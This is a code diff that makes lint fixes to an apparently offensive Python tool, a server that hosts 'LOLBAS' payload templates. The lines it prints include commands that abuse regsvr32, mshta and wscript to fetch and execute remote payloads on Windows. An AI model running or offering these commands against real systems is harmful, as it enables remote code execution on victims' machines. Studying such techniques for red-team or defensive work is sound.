@@ -80,7 +80,7 @@ def run_server(port=8080, directory='lolbas_templates'):
     hostname = socket.gethostname()
     try:
         local_ip = socket.gethostbyname(hostname)
-    except:
+    except Exception:
         local_ip = '127.0.0.1'
     
     # Start server
@@ -89,10 +89,10 @@ def run_server(port=8080, directory='lolbas_templates'):
         print("  LOLBAS Template HTTP Server")
         print("="*60)
         print(f"\n  Server running on port {port}")
-        print(f"\n  Local URLs:")
+        print("\n  Local URLs:")
         print(f"    http://localhost:{port}/")
         print(f"    http://{local_ip}:{port}/")
-        print(f"\n  Available files:")
+        print("\n  Available files:")
         
         # List available files
         for file in Path('.').glob('*'):
@@ -100,7 +100,7 @@ def run_server(port=8080, directory='lolbas_templates'):
                 print(f"    - {file.name}")
                 print(f"      URL: http://{local_ip}:{port}/{file.name}")
         
-        print(f"\n  Example LOLBAS commands:")
+        print("\n  Example LOLBAS commands:")
         print(f"    regsvr32.exe /s /n /u /i:http://{local_ip}:{port}/payload.sct scrobj.dll")
         print(f"    mshta.exe http://{local_ip}:{port}/payload.hta")
         print(f"    wscript.exe http://{local_ip}:{port}/payload.vbs")
